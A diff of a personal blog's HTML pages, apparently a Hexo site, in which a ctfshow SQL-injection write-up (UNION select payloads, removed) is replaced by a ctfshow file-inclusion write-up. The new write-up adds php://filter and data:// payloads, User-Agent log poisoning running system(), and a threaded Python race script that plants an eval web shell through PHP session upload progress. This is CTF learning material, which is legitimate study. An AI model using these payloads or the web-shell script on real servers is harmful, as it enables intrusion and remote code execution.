@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ctfshow-SQL注入, Chenluo">
+    <meta name="keywords" content="ctfshow-文件包含, Chenluo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ctfshow-SQL注入 | Chenluo</title>
+    <title>ctfshow-文件包含 | Chenluo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ctfshow-SQL注入</h1>
+                    <h1 class="description center-align post-title">ctfshow-文件包含</h1>
                 </div>
             </div>
         </div>
@@ -461,7 +461,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-07-10
+                    2021-07-11
                 </div>
                 
 
@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    443
+                    586
                 </div>
                 
 
@@ -490,131 +490,145 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//拼接sql语句查找指定ID用户</span>
-$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from user where username !='flag' and id = '"</span><span class="token punctuation">.</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+                <h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><ul>
+<li>php伪协议读取</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/convetr.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><ul>
+<li>过滤了php</li>
+<li>data伪协议读取</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gscq1wxh3lj30e80fwq45.jpg" alt="image-20210711085008289"></p>
+<ul>
+<li>查看源代码</li>
+</ul>
+<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><ul>
+<li>利用包含日志的方式</li>
+</ul>
+<p>在<code>User-Agent</code>头重插入一句话,并包含日志</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gscsvha3rjj30h403udg0.jpg" alt="image-20210711102742905"></p>
+<ul>
+<li>包含日志</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gscswv8an0j30rh02zdg7.jpg" alt="image-20210711102902302"></p>
+<p>日志路径:</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">/var/log/nginx/access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <ul>
-<li>根据提示的查询语句</li>
+<li>执行一句话</li>
 </ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grm6u5707kj30nu04v0t3.jpg" alt="image-20210618100034235"></p>
-<ul>
-<li>考虑直接闭合，并且使<code>where</code>语句为1，即可查出表中的所有内容</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grm6yb86kkj30fs03gdg0.jpg" alt="image-20210618100436488"></p>
-<p><strong>利用<code>or </code>对于<code>where</code>语句无论<code>id</code>为多少，都会把所有的结果显示出来</strong></p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grm70s8zplj309q03omxb.jpg" alt="image-20210618100659350"></p>
-<ul>
-<li>payload:</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">55&#39; or &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac fl0g.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grm70d7uasj30vn03tmxi.jpg" alt="image-20210618100635516"></p>
-<ul>
-<li>最老实的办法:</li>
+<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><ul>
+<li>送日志包含一句话</li>
 </ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsctyfpd13j30xm0ii442.jpg" alt="image-20210711110511026"></p>
+<ul>
+<li>查看<code>fl0g.php</code>文件</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gscu09leuuj30x70iejv8.jpg" alt="image-20210711110651719"></p>
+<h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><p>跑脚本，包含session文件</p>
+<ul>
+<li>群主的脚本</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> io
+<span class="token keyword">import</span> threading
+
+url<span class="token operator">=</span><span class="token string">'http://9e98676e-0b3e-4f3a-b141-ed5a43cfaced.challenge.ctf.show:8080/'</span>
+sessionid<span class="token operator">=</span><span class="token string">'ctfshow'</span>
+data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+	<span class="token string">"1"</span><span class="token punctuation">:</span><span class="token string">"file_put_contents('/var/www/html/2.php','&lt;?php eval($_POST[2]);?>');"</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">#&lt;?php eval($_POST[1]);?></span>
+<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	fileBytes <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>
+	<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+		response<span class="token operator">=</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>
+			data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+			<span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'&lt;?php eval($_POST[1]);?>'</span>
+			<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+			cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+			<span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessionid
+			<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+			files<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+			<span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'ctfshow.jpg'</span><span class="token punctuation">,</span>fileBytes<span class="token punctuation">)</span>
+			<span class="token punctuation">&#125;</span>
+			<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+		response<span class="token operator">=</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?file=/tmp/sess_'</span><span class="token operator">+</span>sessionid<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>
+			cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+			<span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessionid
+			<span class="token punctuation">&#125;</span>
+			<span class="token punctuation">)</span>
+		resposne2<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span> resposne2<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>
+			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'++++++done++++++'</span><span class="token punctuation">)</span>
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			<span class="token keyword">print</span><span class="token punctuation">(</span>resposne2<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+
+	evnet<span class="token operator">=</span>threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>
+		<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+	evnet<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>访问<code>2.php</code>，拿<code>flag</code></li>
+</ul>
+<h2 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h2><ul>
+<li>脚本</li>
+</ul>
+<h2 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h2><ul>
+<li>对文件内容进行了限制<code>&lt;</code></li>
+<li>继续条件竞争(线程调为10)</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsdy6b24v7j30rs0i5q4k.jpg" alt="image-20210712101641209"></p>
+<p>注意：看文件的时候由于有<code>.</code>那么就需要<code>&#39;&#39;</code></p>
+<h2 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h2><ul>
+<li>同上</li>
+</ul>
+<h2 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h2><h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><ul>
+<li>对文件名进行了<code>urldecode</code></li>
+<li>过滤了<code>php</code>等</li>
+</ul>
+<p>解题思路：</p>
 <ol>
-<li>查询回显位置</li>
+<li>尝试用过滤器string.rot13</li>
 </ol>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-url" data-language="url"><code class="language-url">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;2.php
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj55zjqywj30vt04gt8q.jpg" alt="image-20210716220623270"></p>
+进行两次完全urlencode:
+%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/charseturlencode">编码链接</a></p>
 <ol start="2">
-<li>查库</li>
+<li>content传入完整的php代码</li>
 </ol>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">content = <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat f*.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
+  
+进行rot13编码:
+<span class="token php language-php"><span class="token delimiter important">&lt;?</span>cuc <span class="token function">flfgrz</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gnp s*.cuc'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj57lldchj30vt04gmx8.jpg" alt="image-20210716220758198"></p>
-<ol start="3">
-<li>查表</li>
-</ol>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token string">' union select 1,table_name,3 from information_schema.tables where table_schema='</span>ctfshow_web' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj596h6rbj30vm04cjri.jpg" alt="image-20210716220930163"></p>
-<ol start="4">
-<li>查列</li>
-</ol>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token string">' union select 1,column_name,3 from information_schema.columns where table_schema='</span>ctfshow_web<span class="token string">' and table_name='</span>ctfshow_user' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj5dhy41tj30vo06saab.jpg" alt="image-20210716221338531"></p>
-<ol start="5">
-<li>查字段</li>
-</ol>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> ctfshow_web<span class="token punctuation">.</span>ctfshow_user <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj5fivxfuj30vo08sjru.jpg" alt="image-20210716221535212"></p>
-<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><ol>
-<li>找回显位置</li>
-</ol>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj61s5si8j30vk028glg.jpg" alt="image-20210716223659022"></p>
-<ol start="2">
-<li>查库</li>
-</ol>
-<pre class="line-numbers language-none"><code class="language-none">0&#39; union select 1,database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj62fx0a9j30vo04k3yl.jpg" alt="image-20210716223737439"></p>
-<ol start="3">
-<li>查表</li>
-</ol>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token string">' union select 1,table_name from information_schema.tables where table_schema='</span>ctfshow_web' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj6eyzvd1j30vp042t8o.jpg" alt="image-20210716224939595"></p>
-<ol start="4">
-<li>查列</li>
-</ol>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token string">' union select 1,column_name from information_schema.columns where table_name='</span>ctfshow_user2<span class="token string">' and table_schema='</span>ctfshow_web' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj6iudjmkj30vq04maa1.jpg" alt="image-20210716225322998"></p>
-<ol start="5">
-<li>查字段</li>
-</ol>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> ctfshow_web<span class="token punctuation">.</span>ctfshow_user2 <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj6jxchk6j60vo07kq3402.jpg" alt="image-20210716225424999"></p>
-<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><ul>
-<li>查库</li>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsefoen9rsj30it0c974l.jpg" alt="image-20210712202215399"></p>
+<p><a target="_blank" rel="noopener" href="https://rot13.com/">rot13编码工具</a></p>
+<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><ul>
+<li>利用<code>data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4g</code>读取</li>
+<li>由于过滤了<code>+，=</code>需要在编码的语句后面加上空格补位</li>
 </ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj6lkcwzuj30vp04m0st.jpg" alt="image-20210716225600042"></p>
-<ul>
-<li>查表</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj6mruy5fj30vv06tjro.jpg" alt="image-20210716225709886"></p>
-<ul>
-<li>查字段</li>
-</ul>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token string">' union select 1,2,column_name from information_schema.columns where table_schema='</span>ctfshow_web<span class="token string">' and table_name='</span>ctfshow_user3'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac f*.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> //后边加一个空格<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj6pr40l3j30vm04qweh.jpg" alt="image-20210716230001429"></p>
-<ul>
-<li>查内容</li>
-</ul>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> ctfshow_web<span class="token punctuation">.</span>ctfshow_user <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj6rghawcj30vt07lwer.jpg" alt="image-20210716230139948"></p>
-<p><strong>该出现的没有出现</strong></p>
-<ul>
-<li>根据题目，过滤了flag，可以将<code>password</code>进行<code>hex()</code>编码</li>
-</ul>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow_web<span class="token punctuation">.</span>ctfshow_user3 <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj6yqndnbj30vq08vt97.jpg" alt="image-20210716230839397"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj6z574c0j30ou07mgm9.jpg" alt="image-20210716230902712"></p>
-<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><pre class="line-numbers language-none"><code class="language-none">$sql &#x3D; &quot;select username,password from ctfshow_user4 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
-
-&#x2F;&#x2F;检查结果是否有flag
-    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;
-      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;
-    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>结果中不允许出现数字</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select
-replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),'</span><span class="token number">1</span><span class="token string">','</span>numA<span class="token string">'),'</span><span class="token number">2</span><span class="token string">','</span>numB<span class="token string">'),'</span><span class="token number">3</span><span class="token string">','</span>numC<span class="token string">'),'</span><span class="token number">4</span><span class="token string">','</span>numD<span class="token string">'),'</span><span class="token number">5</span><span class="token string">','</span>numE<span class="token string">'),'</span><span class="token number">6</span><span class="token string">','</span>numF<span class="token string">'),'</span><span class="token number">7</span><span class="token string">','</span>numG<span class="token string">'),'</span><span class="token number">8</span><span class="token string">','</span>numH<span class="token string">'),'</span><span class="token number">9</span><span class="token string">','</span>numI<span class="token string">'),'</span><span class="token number">0</span><span class="token string">','</span>numJ<span class="token string">'),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),'</span><span class="token number">1</span><span class="token string">','</span>numA<span class="token string">'),'</span><span class="token number">2</span><span class="token string">','</span>numB<span class="token string">'),'</span><span class="token number">3</span><span class="token string">','</span>numC<span class="token string">'),'</span><span class="token number">4</span><span class="token string">','</span>numD<span class="token string">'),'</span><span class="token number">5</span><span class="token string">','</span>numE<span class="token string">'),'</span><span class="token number">6</span><span class="token string">','</span>numF<span class="token string">'),'</span><span class="token number">7</span><span class="token string">','</span>numG<span class="token string">'),'</span><span class="token number">8</span><span class="token string">','</span>numH<span class="token string">'),'</span><span class="token number">9</span><span class="token string">','</span>numI<span class="token string">'),'</span><span class="token number">0</span><span class="token string">','</span>numJ<span class="token string">') from ctfshow_user4 where username='</span>flag' <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>flag{cascdas_adczsdsa_1211_sss}</p>
-
+<h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2>
                 
             </div>
             <hr/>
@@ -640,7 +654,7 @@ replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://echo-machile.github.io/2021/07/10/72345.html">http://echo-machile.github.io/2021/07/10/72345.html</a>
+                    <a href="http://echo-machile.github.io/2021/07/11/79009.html">http://echo-machile.github.io/2021/07/11/79009.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1137,6 +1151,51 @@ document.body.addEventListener('click', function(e) {
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
+                <a href="/2021/07/17/7009.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="ctfshow-php特性">
+                        
+                        <span class="card-title">ctfshow-php特性</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-17
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            尘落
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTFSHOW/">
+                        <span class="chip bg-color">CTFSHOW</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
                 <a href="/2021/07/10/4322.html">
                     <div class="card-image">
                         
@@ -1153,9 +1212,9 @@ document.body.addEventListener('click', function(e) {
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1169,51 +1228,6 @@ document.body.addEventListener('click', function(e) {
                     
                     <a href="/tags/git/">
                         <span class="chip bg-color">git</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/06/12/867.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="n1book-web入门">
-                        
-                        <span class="card-title">n1book-web入门</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-12
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            尘落
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/ctf-web/">
-                        <span class="chip bg-color">ctf-web</span>
                     </a>
                     
                 </div>
